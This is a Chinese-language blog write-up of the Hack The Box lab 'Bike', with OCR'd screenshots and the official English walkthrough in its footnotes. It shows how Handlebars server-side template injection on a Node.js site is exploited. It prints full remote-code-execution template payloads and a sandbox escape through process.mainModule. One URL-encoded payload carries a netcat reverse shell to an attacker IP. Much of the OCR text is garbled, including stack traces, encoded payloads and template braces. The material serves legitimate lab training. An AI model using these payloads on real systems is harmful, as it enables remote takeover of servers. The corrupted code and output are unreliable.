---
layout: ../../layouts/BlogPost.astro
title: "[Hack The Box] [Starting Point] [Tier 1] Bike"
uuid: eab5af94-34c5-11ed-8ea4-9e3dc202409c
version: 369
created: Thu, 15 Sep 2022 07:13:34 +0000
tags:
- z-class/career/pentest
- y-type/resource
- x-status/publish/writeup
---

**TASK 1**

**What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.** 22,80

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/7cf46d8d-0531-41de-9f9f-c93768ad72c4.png) [^1]

**TASK 2**

**What software is running the service listening on the http/web port identified in the first question?** Node.js

**TASK 3**

**What is the name of the Web Framework according to Wappalyzer?** Express

**TASK 4**

**What is the name of the vulnerability we test for by submitting {{7\*7}}?** Server Side Template Injection

**TASK 5**

**What is the templating engine being used within Node.JS?** Handlebars

根据[SSTI (Server Side Template Injection) - HackTrick](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)   按流程来判断，

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/a4a7ae07-ff93-435d-9911-ee01e1750aa2.png)

输入 ${7\*7}，没有报错，接着尝试{{7\*7}}，成功报错：

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/643fc142-5b33-4b78-84cc-a2edd6d406a1.png)

**TASK 6**

**What is the name of the BurpSuite tab used to encode text?** Decoder

**TASK 7**

**In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?** URL

**TASK 8**

**When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?** require

尝试{{7\*'7'}}，也成功报错，可以判断存在SSTI注入的可能

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/5a16f1ce-dd67-4a7d-a1dc-ae452812cd7d.png)

接下来就是直接使用handlebar模板的注入代码：[SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs) 

首先看能不能路径穿越，爆出error，失败了

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/6218a7f7-8b0c-4fa7-9cf7-12d3866df110.png) [^2]

那直接用提供的URLencoded:

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/235a4c19-8e40-45e5-88f6-cfddb5fcbaf1.png)

**TASK 9**

**What variable is the name of the top-level scope in Node.JS?** global

**TASK 10**

**By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?** root

require 是JavaScript的关键词，但这里却显示没有定义，可能和node.js的关键词冲突了，查了下[官方文档](https://nodejs.org/api/globals.html#global-objects) ，可以看出，require不是global范围的

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/e755a15c-4e62-49c7-bdb6-d6ce5b3cbab1.png) [^3]

我们先查看下注入的代码：`{{this.push "return **require**('child_process').exec('whoami');"}}`

代码里要调用的是`child_process`，查看[文档](https://nodejs.org/api/child_process.html) 可知，这个功能有用到process![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/559e6464-4843-4125-b518-6ca43052dda8.png) [^4]

我们来尝试看看能不能返回个process:

把上面那一行代码改为 `{{this.push "return process;"}}`,可以通过[URLencoded](https://www.urlencoder.io/) 工具，编码了重新发送，成功执行：

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/d095ed65-f343-43ff-96a8-895424cd74f4.png) [^5]

然后试了好几个process文档中的函数，貌似都没有可以执行特定命令的

不过注意到`process.mainModule`是快过期的一个函数，后续将会被require.main代替，可以试一试

使用`{{this.push "return **process.mainModule**;"}}`可以成功调用,　

直接注入：`{{this.push "return **process.mainModule**('child_process').exec('whoami');"}}`，并没有成功爆出

通过[文档](https://nodejs.org/api/child_process.html)可知，可以利用另一个`{{this.push "return process.mainModule('child_process').**execSync**('whoami');"}}`,成功执行：

![](/images/eab5af94-34c5-11ed-8ea4-9e3dc202409c/c4fc6382-1c78-42d2-96ba-48ebdd2a3543.png) [^6]

接下来就简单了，正常flag是在主目录下，找下就ok啦

Note:

[Bike.pdf](/attachments/Bike.pdf) [^7]

Ref:

[Server-side template injection \| Web Security Academy (portswigger.net)](https://portswigger.net/web-security/server-side-template-injection) 

The following is a list of important (but not limited) template engines for Node.js

- [Jade](https://github.com/jadejs/jade) 

- [Vash](https://github.com/kirbysayshi/vash) 

- [EJS](https://github.com/tj/ejs) 

- [Mustache](https://github.com/janl/mustache.js) 

- [Dust.js](https://github.com/linkedin/dustjs) 

- [Nunjucks](https://github.com/mozilla/nunjucks) 

- [Handlebars](https://github.com/wycats/handlebars.js) 

- [atpl](https://github.com/soywiz/atpl.js) 

- [haml](https://github.com/tj/haml.js) 

 

[^1]: $ nmap -sC -sV $ip
    Starting Nmap 7.92 ( https : //nmap.org ) at 2022-09-16 02:01 UTC
    Nmap scan report for 10. 129.232.63
    Host is up (0.29s latency).
    Not shown: 998 closed tcp ports ( conn-refused)
    PORT
    STATE SERVICE VERSION
    22/tcp open ssh
    OpenSSH 8. 2p1 Ubuntu 4ubuntue . 4 (Ubuntu Linux; pro
    tocol 2.0)
    ssh-hostkey :
    3072 48: ad : d5 : 68: 3a : 9f : bc : be : f7 : e8 :20: 1e: f6: bf: de : ae (RSA)
    256 67:89: 6c : 0b : 20 : ed : 49 :62: c1 :86 :7c:29:92:74:1c:1f (ECDSA)
    256 18: cd : 9d : 08 : a6:21: a8 :68:66 : f7:9f : 8d : 40 :51:54: fb (ED25519)
    80/tcp open http
    Node . js (Express middleware )
    _http-title: Bike
    Service Info: OS: Linux; CPE: cpe: /o: linux: linux_kernel
    Service detection performed. Please report any incorrect results at htt
    ps : //nmap . org/submit/ .
    Nmap done: 1 IP address (1 host up ) scanned in 53.79 seconds

[^2]: -$ curl -X 'POST' -H ' Content-Type: application/json' -data-binary $
    {\\ "profile\\": {"layout\\": \\"./ ../routes/index. js\\"}}' 'http: //10. 129.2
    33.215/'
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Error</title>
    </head>
    <body>
    <pre>Error: You must pass a string or Handlebars AST to Handlebars . com
    pile. You passed undefined<br> &nbsp; &nbsp; at Object. compile (/root/B
    ackend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler . j
    s : 501: 11)<br> &nbsp; &nbsp; at HandlebarsEnvironment . hb . compile (/root/
    Backend/node_modules/handlebars/dist/cjs/handlebars . js : 39:40)<br> &nbs
    p; &nbsp; at router . post (/root/Backend/routes/handlers . js : 13:29)<br> &
    nbsp; &nbsp; at Layer . handle \[as handle_request\] (/root/Backend/node_mo
    dules/express/lib/router/layer . js : 95:5)<br> &nbsp; &nbsp; at next (/roo
    t/Backend/node_modules/express/lib/router/route . js : 137:13)<br> &nbsp;
    &nbsp; at Route . dispatch (/root/Backend/node_modules/express/lib/router
    /route . js : 112:3)<br> &nbsp; &nbsp; at Layer . handle \[as handle_request\]
    ( /root/Backend/node_modules/express/lib/router/layer . js :95:5)<br> &nbs
    p; &nbsp; at /root/Backend/node_modules/express/lib/router/ index. js :281
    :22<br> &nbsp; &nbsp; at Function. process_params (/root/Backend/node_mo
    dules/express/lib/router/ index. js : 341:12)<br> &nbsp; &nbsp; at next (/r
    oot/Backend/node_modules/express/lib/router/ index. js : 275 : 10 )</pre>
    </body>
    </html>

[^3]: Node.js v18.9.0 \| - Table of contents \| - Index \| - Other versions \| - Options
    Global objects
    These objects are available in all modules. The following variables may appear to be global but are not. They exist only in the scope of modules, see the module system documentation :
    dirname
    filename
    exports
    module
    .
    require ()
    The objects listed here are specific to Node.js. There are built-in objects that are part of the JavaScript language itself, which are also globally accessible.

[^4]: The command lookup is performed using the options . env. PATH environment variable if env is in the options object. Otherwise,
    process. env. PATH is used. If options . env is set without PATH , lookup on Unix is performed on a default search path search of
    /usr/bin:/bin (see your operating system's manual for execvpe/execvp), on Windows the current processes environment variable
    PATH is used.

[^5]: New Request
    Search
    Blocking
    Do File
    In
    Tri
    Headers
    Cookies
    Request
    Response
    Timings
    Stack Trace
    V
    Connection
    keep-alive
    EFZ
    do \| 1.2 - HTML
    Raw
    V
    Referer
    http://10.129.234.233/
    : cy home.css sty c cac
    V
    Upgrade-Inse...
    E c jquery.mi scr j cac
    V
    User-Agent
    Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 105...
    : c typer scr j cac
    V
    Accept
    text/html,application/xhtml+xml, application/xml;...
    We can let you know once we are up and running.
    main
    scr j cac
    V
    Accept-Langu... zh-CN, en-US;q=0.7,en;q=0.3
    c/ butt
    img & cac
    E-mail
    Submit
    V
    Content-Type
    application/x-www-form-urlencoded
    cy background cac
    V
    name
    value
    We will contact you at: e 2 \[object Object\] function Function() { \[native code\] } 2 \[object Object\] \[object process\]
    c favicon.ic Far + cac
    Body
    EFI
    A Ne' + 1.4
    email=%78%78%23with%20%22s%22%20as%20%7(string%70%70%70%0A

[^6]: We can let you know once we are up and running.
    E-mail
    Submit
    We will contact you at: e 2 \[object Object\] function Function() { \[native code\] } 2 \[object Object\] root

[^7]: Bike Write-up
    Prepared by: pwninx
    Introduction
    This machine focuses on the exploitation of a Server Side Template Injection vulnerability identified in
    Handlebars, a template engine in Node.js. This walkthrough will demonstrate how to exploit an SSTI in a
    web server, when the developer doesn't sanitise user input correctly. We will also cover the basics of
    Node.js, Template Engines and global variables, as well as how to escape a sandboxed environment with
    restricted Javascript commands available.
    Enumeration
    The first step is to scan the target IP address with Nmap to check what ports are open. We'll do this with the
    help of a program called Nmap. Here is a quick explanation of what each flag is and what it does.
    -SC: Performs a script scan using the default set of scripts. It is equivalent to --
    script=default.
    -SV: Version detection
    -v: Increases the verbosity level, causing Nmap to print more information about the
    scan in progress.
    O
    $ nmap -sC -sV -v {target_IP}
    PORT
    STATE
    SERVICE
    VERSION
    22/tcp
    open
    ssh
    OpenSSH 8.2p1 Ubuntu 4ubuntu0 . 4
    (Ubuntu Linux; protocol 2.0)
    ssh-hostkey :
    3072 48: ad : d5 : b8: 3a: 9f : bc : be : f7 : e8:20: le: f6: bf : de: ae (RSA)
    256 b7: 89: 6c : 0b : 20: ed : 49 : b2 : c1 : 86: 7c: 29:92:74: 1c: 1f (ECDSA)
    80/tcp
    open
    http
    Node . js ( Express middleware)
    I_http-title: Bike
    http-methods :
    Supported Methods : GET POST HEAD OPTIONS
    The scan reveals port 22 (SSH) open, however, we will ignore it for now as we don't have credentials or keys
    that can be used to authenticate. We also have port 80 open, which is running an HTTP Node.js server and
    making use of the Express framework.
    Hellol
    We can let you know once we are up and running.
    E-mail
    SUBMIT
    Upon visiting port 80, we are presented with a webpage that is currently under construction and the option
    to subscribe to updates about the page using an email address. An email subscription in web pages is
    usually an option that allows web visitors to receive updates via email, regarding the status of the website or
    the company or individual that owns it.
    Let's provide a test email to verify we have a working application. When given an application to test, use it as
    if you are using it intendedly. Sometimes, developers put in poor code as a quick solution, leading to
    vulnerabilities. Let's input the email pwninxehackthebox . eu and click submit.
    Hello, there
    We can let you know once we are up and running.
    pwninx@hackthebox.eu
    SUBMIT
    Once we click submit, the page refreshes and we get the following output.
    Website
    We can let you know once we are up and running.
    E-mail
    SUBMIT
    We will contact you at: pwninx@hackthebox. eu
    The output shows that any input that is submitted in the Email field gets reflected back to the user once the
    page reloads. This could lead us down a trail of thinking about various potential exploitation vectors such as
    Cross Site Scripting (XSS), however, we first need to know what frameworks and coding languages the
    website uses for its backend.
    In this instance we have a pretty good rundown of the server backend from the Nmap report on port 80,
    however, we can also use a helpful extension called Wappalyzer, which scans the website and finds
    information the web page is using, such as:
    . Web Frameworks
    . JavaScript Frameworks
    . Web Servers
    . Programming Languages
    . Widgets
    . And many more...
    To install an add-on such as Wappalyzer, one needs only go to the respective extension store of the browser
    they are using (Chrome, Firefox, etc). After installing and navigating back to the Bike machine on port 80 we
    get the following output from the add-on.
    Wappalyzer
    TECHNOLOGIES
    MORE INFO
    _ Export
    Web frameworks
    CDN
    ex
    Express
    <>Google Hosted Libraries
    Web servers
    JavaScript libraries
    ex
    Express
    jQuery 2.2.4
    Programming languages
    Node.js
    Generate sales leads
    Find new prospects by the technologies they use. Reach out to
    customers of Shopify, Magento, Salesforce and others.
    Create a lead list -
    Both Nmap and Wappalyzer have reported that the server is built on Node.js and is using the Express
    framework.
    What is Node.js?
    Node.js is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build
    scalable network applications.
    What is Express?
    Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web
    and mobile applications.
    With this information in mind we can start identifying potential exploitation paths. Various attempts at
    verifying an XSS vulnerability with default payloads, such as <script>alert(1)</script>, have been
    unsuccessful. For this reason we must look for a different vulnerability.
    Node.js and Python web backend servers often make use of a software called "Template Engines".
    What is a Template Engine?
    Template Engines are used to display dynamically generated content on a web page. They replace the
    variables inside a template file with actual values and display these values to the client (i.e. a user opening a
    page through their browser).
    For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
    Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
    users with a static HTML page. The template engine would be used here, along a static "template" that
    contains the basic structure of the profile page, which would then manually fill in the user information and
    display it to the user.
    Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
    today is called Server Side Template Injection (SSTI).
    What is an SSTI?
    Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
    to execute commands on the server.
    To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
    Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
    execution on the affected server.
    This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
    being used to reflect the email that the user inputs in the contact field.
    Identification
    In order to exploit a potential SSTI vulnerability we will need to first confirm its existence. After researching
    for common SSTI payloads on Google, we find this Hacktricks article that showcases exploitation techniques
    for various different template engines. The following image shows how to identify if an SSTI vulnerability
    exists and how to find out which Template engine is being used. Once the engine is identified a more
    specific payload can be crafted to allow for remote code execution.
    Smarty
    a{\*comment\*}b
    Mako
    $("z" join("ab")}
    Unknown
    $17\*7}
    Jinja2
    Twig
    Not vulnerable
    Unknown
    The Identify paragraph in the Hacktricks page shows a variety of special characters commonly used in
    template expressions.
    (17\*7}}
    $(7\*7}
    <8= 7\*7 8>
    ${{7\*7 }}
    #(7\*7}
    Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities.
    If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code
    and attempt to execute them, in this instance calculating the mathematical equation 7\*7 (Seven multiplied
    by Seven), which is equal to 49.
    To test for the vulnerability lets try inputting ${7\*7) into the email submission form.
    Website Und
    We can let you know once we are up and running.
    E-mail
    SUBMIT
    We will contact you at: $(7\*7}
    The server did not execute the expression and only reflected it back to us. Let's move on to the second
    payload, which is {{7\*7}}
    Remain\|
    We can let you know once we are up and running.
    ((7\*7}}
    SUBMIT
    After the payload is submitted, an error page pops up.
    & view-source:http://10.129.97.64/
    For quick access, place your bookmarks here on the bookmarks toolbar. Manage bookmarks...
    Error: Parse error on line 1:
    Expecting &#39; 106#39;, &
    9:. 6039; STRINGS#39;, &#39; NUMBER&#39; , 6#39; BOOLEAN6439; , 6#39; UNDEFINED6#39; , &#39: NULLE#39;, &#39; DATA&#39;, got &#39; INVALIDE#39;
    at Parser.parseError (/root/Backend/node modules/handlebars/dist/cjs/handlebars/compiler/parser . js:268:19)
    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser . js:337:38)
    at HandlebarsEnvironment.parse
    root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base. js:45:43)
    at compileInput (/ro
    odules/handlebars/dist/cjs/handlebars/compiler/compiler. js:515:19)
    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler. js:524:18)
    10
    at Object.handle (/root/Backend/routes/handlers . js:16:16)
    at next_ Layer (
    press/lib/router/route. js:183:13)
    at Route. dispatch (/root/Backend/node_m
    odules/express/lib/router/route. js:187:5)
    at / root/Backend/node_modules/express/lib/router/index. js: 195:24
    at Function. proto. process_params (/root/Backend/mode_modules/express/lib/router/index. js:253:12)
    This means that the payload was indeed detected as valid by the template engine, however the code had
    some error and was unable to be executed. An error is not always a bad thing. On the contrary for a
    Penetration Tester, it can provide valuable information. In this case we can see that the server is running
    from the /root/Backend directory and also that the Handlebars Template Engine is being used.
    Exploitation
    Looking back at Hacktricks, we can see that both Handlebars and Node.js are mentioned, as well as a
    payload that can be used to potentially run commands on a Handlebars SSTI.
    To determine if this is the case, we can use Burpsuite to capture a POST request via FoxyProxy and edit it
    to include our payload. We provide a great module on Using Web Proxies. If you have not used BurpSuite
    before it will provide a lot of valuable information.
    Using Web
    Proxies
    After BurpSuite has been started and the web proxy correctly configured, submit the payload again.
    BurpSuite should capture the request and allow you to edit it.
    Burp Project Intruder Repeater Window Help
    Dashboard Target
    Proxy Intruder Repeater Sequencer Decoder Comparer Extender Project options User options
    ntercept HTTP history WebSockets history \| Options
    Request to http://10.129.97.64:80
    Forward
    Drop
    Intercept is on
    Action
    Open Browser
    Raw Params Headers Hex
    Pretty
    Raw In
    Actions v
    1 POST / HTTP/1. 1
    2 Host: 10. 129. 97. 64
    3 User - Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
    4 Accept: text/html, application/xhtml+xml, application/xml; q=0.9, image/webp, \*/\*;q=0.8
    5 Accept - Language: en- US, en; q=0.5
    Accept- Encoding: gzip, deflate
    7 Content- Type: application/x-www- form-urlencoded
    8 Content - Length: 35
    9 Origin: http://10. 129.97.64
    LO DNT : 1
    11 Connection: close
    12 Referer : http://10. 129.97.64/
    13 Upgrade- Insecure - Requests: 1
    14 Sec - GPC: 1
    15
    16 email=$78%787\*7%70%7D&action=Submit
    Before we modify the request, let's send this HTTP packet to the Repeater module of BurpSuite by
    pressing CTRL+R. Now let's grab a payload from the section that is titled " Handlebars (NodeJs) " in the
    HackTricks website.
    { {#with "s" as \[string/} }
    {{#with "e"}}
    {{#with split as (conslist/} }
    {{this . pop} }
    {{this . push (lookup string. sub "constructor" ) } }
    {{this . pop} }
    { {#with string. split as \[codelist/} }
    {{this . pop} }
    { {this. push "return require( 'child_process' ) . exec ( 'whoami' ) ; "}}
    {{this. pop} }
    {{#each conslist} }
    { {#with (string. sub. apply 0 codelist)} }
    {{this} }
    {{/with} }
    {{/each} }
    {{/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    The above code might seem daunting to understand, but for this writeup our main focus will be the
    following line.
    {{this. push "return require( 'child_process' ) . exec( 'whoami ' ) ; "}}
    This line instructs the server to execute a specific system command (in this case whoami ). Later in the write-
    up we will be modifying this line to execute different commands on the server. After copying the full payload
    from Hacktricks, we must URL encode it so that it will be correctly passed to the server.
    URL Encoding
    When making a request to a web server, the data that we send can only contain certain characters from the
    standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For
    this reason we use an encoding procedure that is called URL Encoding .
    With this process for instance, the reserved character & becomes $26 . Luckily, BurpSuite has a tab called
    Decoder that allows us to either decode or encode the text of our choice with various different encoding
    methods, including URL.
    Let's paste the above payload into the top pane of the Decoder and select Encode as > URL.
    Burp Project Intruder Repeater Window Help
    Dashboard Target Proxy Intruder R
    Repeater Sequencer
    Decoder
    Comparer Logger Extender Project options User options Leam
    { {this-pop}}
    O Text OHex
    ( (this.push "return require("child_process") exec( whoamil:" })
    i(this.pop}}
    Decode as ...
    (#each consist } }
    ((@with (atring.sub.apply D codelist))}
    Encode as ..
    9209620% 20962034 20%62014.2016 2096.2034 76%67614 7 4%6896594 72%:7di.7chuD
    $20%6201420% 209620%2
    SOI hex
    Octal
    Binary
    Copy the URL encoded payload that is in the bottom pane and paste it in the email= field via the request
    tab. You will get something similar to the following image.
    Dashboard
    Target
    Proxy
    Intruder
    Repeater
    Sequencer
    Decoder
    3 x
    ..
    Send
    Cancel <> > >
    Request
    Pretty Raw Hex
    1 POST / HTTP/1. 1
    2 Host: 10. 129. 97. 64
    3 User - Agent: Mozilla/5.0 (Xll; Linux x86_64; rv:91.0) Gecko/20100101
    Firefox/91. 0
    4 Accept:
    text/html, application/xhtml+xml, application/xml; q=0.9, image/webp, \*/\*; q=0
    .8
    5 Accept - Language: en-US, en; q=0.5
    6 Accept- Encoding: gzip, deflate
    7 Content- Type: application/x-www- form-urlencoded
    8 Content - Length: 1883
    9 Origin: http://10. 129.97.64
    10 Connection: close
    11 Referer: http://10. 129.97.64/
    12 Upgrade - Insecure- Requests: 1
    13
    14 email=
    676%76%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d
    %7d%Oa%20%20%76%76%23%77%69%74%68%20%22%65%22%7d%7d%Oa%20%20%20%20%76%7b
    623%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f6e%73%6c%69%73%74
    67c%7d%7d%Oa%20%20%20%20%20%20%76%76%74%68%69%73%2e%70%6f%70%7d%7d%0a%20
    620%20%20%20%20%76%76%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%66%75%70
    %20%73%74%7269%6e%67%2e%73%75%62%20%2263%6f%6e%73%74%72%75%63%74%6f %72
    %22%29%7d%7d%Oa%20%20%20%20%20%20%76%76%74%68%69%73%2e%70%6f%70%7d%7d%Oa
    %20%20%20%20%20%20%76%76%23%77%69%74%68%20%73%74%7269%6e%67%2e%73%70%6c
    $69%74%20:61%73%20%7c%63%6f %64%65%6c:69%73%74%7c%7d%7d%Oa%20%20%20%20%20
    %20%20%20%76%76%74%68%69%73%2e%70%6f%70%7d%7d%Oa%20%20%20%20%20%20%20%20
    676%76%74%68%69%73%2e%70%75%73%68%20%22%7265%74%75%726e%20%67%6c%6f%62
    $61%6c%2e%70%72%6f%63%65%73%73%2e%6d61%69%6e%4d%6f%64%75%6c%65%2e%63%6f
    6e%73%74%72%75%63%74%6f%72%2es5f%6c%6f%6164%28%27%63%68%69%6c%64%5f %70
    672%6f %63%65%73%73%27%29%2es65%7865%63%53%79%6es63%28%27%72%6d%20%2f%74
    6d%70%2f%66%36%6d%6b%66%69%66%6f%20%2f %74%6d%70%2f %66%3b%6361%74%20%2f
    %74%6d%70%2f%66%7c%62%61%7368%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30
    %2e%31%30%2e%31%34%2e%33%33%20%31%33%33%37%20%3e%2f%74%6d%70%2f%66%27%29
    %36%22%7d%7d%Oa%20%20%20%20%20%20%20%20%76%76%7468%69%73%2e%70%6f%70%7d
    %7d%Oa%20%20%20%20%20%20%20%20%76%76%23%65%61%63%68%20%63%6f%6e%73%6c%69
    673%74%7d%7d%Oa%20%20%20%20%20%20%20%20%20%20%76%76%23%77%69%74%68%20%28
    673%74%7269%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%%63%6f %64%65%6c
    %69%73%74%29%7d%7d%Oa%20%20%20%20%20%20%20%20%20%20%20%20%76%76%74%68%69
    %73%7d%7d%Oa%20%20%20%20%20%20%20%20%20%20%76%76%2f%77%69%74%68%7d%7d%0a
    620%20%20%20%20%20%20%20%76%76%2f%65%61%63%68%7d%7d%Oa%20%20%20%20%20%20
    676%76%2f%77%69%74%68%7d%7d%0a%20%20%20%20%76%76%2f%77%69%74%68%7d%7d%Oa
    %20%20%76%76%2f%77%69%74%68%7d%7d%0a%76%76%2f%77%69%74%68%7d%7d&action=
    Submit
    Next, let's try sending the payload by clicking on the orange " send " button in the top.
    Send
    Cancel
    <Y
    Request
    Pretty
    Raw
    Hex
    Response
    Pretty Naw Hex Render =
    HTTP/1.1 500 Internal Server Error
    2 X-Powered. By: Express
    cantant-Type: text/html
    Data: Tus, 27 Feb 2022 02:00:23 GMT
    Connection: close
    ReferenceError: require is not defined
    at Function.61. ti anonymous
    at Function.eval fecal at ultisnowy usegt deval at createfunctionContext (,root/Backend/mode_modules/handlebars/dist/cjs/handlebars/compiler/jawascript.compiler .351254:2393. 6itzanonymous6at1 131 1>
    : anonymousset: Tyroot/Backend/mode_nodules/handlebars/ dist/cjs/handlebars/helpers/with. js: 10:251
    /Backand/node_modules/handlebars/distzejs
    wearartistvejs/handlebars/compiler/javascript- compiler .js:254:230. alt;anonymousBat;:3:37)
    causeIteration (/root/Black
    (/root/Blackand/mode_redulea/handlebars/dist/cja/handlebara/halpern/em
    and leber a/halpara/each. ja:51:10\]
    14 at Array.alt; anonymousgt; \[/root/Backand/nade_modules/handlebars/dist/cja/handlebars/helpers/each. jm:51: 12!
    16 at prog (/root/Backend/node_modules/handlebars/dist/cjshandlebars/runtime. js:221:12)
    nine shark/chut/c\]w/handlebars/compiler/javascript-compiler .js:254:22), alt; anonymouskqt;: 12:21\]
    handlebars/dist/cjs/handlebars
    8 at eval leval at createFunctionContext \[/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript. compiler. js:254:230. altzone
    6gta 1 121 841
    The response shows an error that states require is not defined . Taking a look at the payload we notice
    the following code.
    {{this . push "return require( 'child_process' ) . exec( 'whoami ' ); "}}
    This is likely the part of the payload that is erroring out. require is a keyword in Javascript and more
    specifically Node.js that is used to load code from other modules or files. The above code is attempting to
    load the Child Process module into memory and use it to execute system commands (in this case whoami ).
    Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the
    event of malicious code being run, it will be very hard to load modules that can run system commands. If we
    cannot directly use require to load such modules, we will have to find a different way.
    Globals
    In computer programming "Globals" are variables that are globally accessible throughout the program. In
    Node.js this works similarly, with Global objects being available in all loaded modules. A quick Google search
    using the keywords Node. is Global Scope reveals this documentation that details all of the available
    Global Objects in Node.js. It is worth noting that the documentation also showcases a list of variables that
    appear to be global objects, but in fact are built-in objects. These are the following:
    dirname
    filename
    exports
    module
    require ( )
    As seen from the list, require is in fact not in the global scope and therefore in specific cases it might not
    be accessible. Taking a closer look at the documentation we see that there is a process object available. The
    documentation states that this object provides information about, and control over, the current Node. js process.
    We might be able to use this object to load a module. Let's see if we can call it from the SSTI. Modify your
    payload as follows:
    {{#with "s" as \|string/}}
    {{#with "e"}}
    { {#with split as (conslist/} }
    {{this . pop} }
    {{this . push (lookup string. sub "constructor" ) } }
    {{this . pop} }
    {{#with string . split as \[codelist/} }
    {{this. pop} }
    {{this . push "return process; "} }
    {{this . pop} }
    {{#each conslist} }
    { {#with (string . sub. apply 0 codelist)} }
    {{this} }
    {{/with} }
    {{/each} }
    ({/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    URL encode the payload as shown previously and send it using BurpSuite Repeater.
    We will contact you at:
    2
    \[object Object\]
    function Function( ) { \[native code\] }
    2
    \[object Object \]
    \[object process \]
    The response did not contain an error and we can see the \[object process \] has been included. This
    means that the process object is indeed available.
    Taking a closer look at the documentation of the process object, we see that it has a mainModule property
    that has been deprecated since version 14.0.0 of Node.js, however, deprecated does not necessarily mean
    inaccessible. A quick Google search using the keywords Node. is mainModule reveals this blog post that
    details the usage of this property.
    Specifically, it mentions that this property returns an object that contains the reference of main module. Since
    handlebars is running in a sandboxed environment, we might be able to use the mainModule property to
    directly load the main function and since the main function is most probably not sandboxed, load require
    from there. Let's modify our payload once more to see if mainModule is accessible.
    ((#with "'s" as \[string/}}
    { {#with "e"} }
    { {#with split as \[conslist/} }
    {{this . pop} }
    { {this . push (lookup string. sub "constructor") }}
    { {this . pop} }
    ({#with string. split as \[codelist/} }
    {{this . pop}}
    {{this . push "return process .mainModule; "}}
    {{this. pop} }
    {{#each conslist} }
    {{#with (string. sub. apply 0 codelist)} }
    {{this} }
    {{/with} }
    {{/each} }
    {{/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    URL encode the payload and send it using the Repeater module as shown previously. The following
    response is returned:
    We will contact you at:
    2
    \[object Object\]
    function Function( ) { \[native code\] }
    \[object Object\]
    \[object Object\]
    No error this time either and we see an extra object at the end of the response, which means the property is
    indeed available. Now lets attempt to call require and load a module. We can load the child_process
    module as it is available on default Node.js installations and can be used to execute system commands.
    Modify the payload as follows:
    { {#with "'s" as \[string/}}
    { {#with "e"}}
    {{#with split as (conslist/}}
    {{this . pop} }
    {{this . push (lookup string. sub "constructor" ) } }
    {{this . pop} }
    {{#with string . split as \[codelist/} }
    {{this.pop} }
    {{this. push "return process . mainModule. require( 'child_process' ) ; "} }
    {{this. pop} }
    {{#each conslist}}
    {{#with (string. sub. apply 0 codelist)} }
    {{this} }
    {{/with} }
    {{/each} }
    ({/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    After URL encoding and sending the payload, we get the following response from the server:
    We will contact you at:
    2
    \[object Object\]
    function Function( ) { \[native code\] }
    \[ object Object\]
    \[object Object \]
    The require object has been called successfully and the child_process module loaded. Let's now
    attempt to run system commands.
    {{#with "'s" as \[string/}}
    {{#with "e"}}
    {{#with split as \[conslist/} }
    {{this . pop} }
    {{this . push (lookup string. sub "constructor") } }
    {{this . pop}}
    ({#with string . split as \[codelist/} }
    {{this. pop})
    {{this . push "return
    process . mainModule. require( 'child_process' ) . execSync ( 'whoami ' ) ; "}}
    {{this. pop} }
    {{#each conslist} }
    { {#with (string. sub. apply 0 codelist)} }
    {{this} }
    {{/with} }
    {{/each} }
    {{/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    We will need to URL encode the above payload once again.
    Dashboard Target Proxy Intruder Repeater Sequencer Decoder Comparer Logger Extender Project options User options Leam
    {{this pop} }
    O Text OHex
    (?)
    (this Book
    ((this push "return global.process mainModule .constructor._load'child_process') wereSync( whoam/}:" }}
    Decode 35
    {{reach conslist } }
    Encode an .
    {{@with \[string sub apply . code list)} }
    (with } }
    Plain
    URL
    HIM
    $67b47646239677%469567 436 6814 20962214 73962256.2014 6 2967 3562014 7c4 73967 4567214699650%67947c4 74367d:60at4209620%4 760476562314 77965936741468962036 229465962216 745671560204205620%2164
    SCI hex
    Octal
    anary
    Copy the payload in the bottom pane and paste it into the email= field once more, replacing the previous.
